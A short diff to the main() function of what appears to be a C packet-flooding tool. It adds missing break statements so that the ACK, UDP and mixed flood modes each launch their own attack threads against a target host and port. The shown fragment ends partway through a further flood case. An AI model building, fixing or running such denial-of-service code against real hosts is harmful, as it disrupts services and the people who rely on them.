@@ -806,16 +806,19 @@ int main(int argc, char **argv)
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
             interface_tx_thread();
+            break;
         case UDP_FLOOD:
             if(!quiet) printf("UDP FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, udp_flood_attack_thread, NULL);
             interface_tx_thread();
+            break;
         case MIX_FLOOD:
             if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, mix_flood_attack_thread, NULL);
             interface_tx_thread();
+            break;
         case MIX2_FLOOD:
             if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
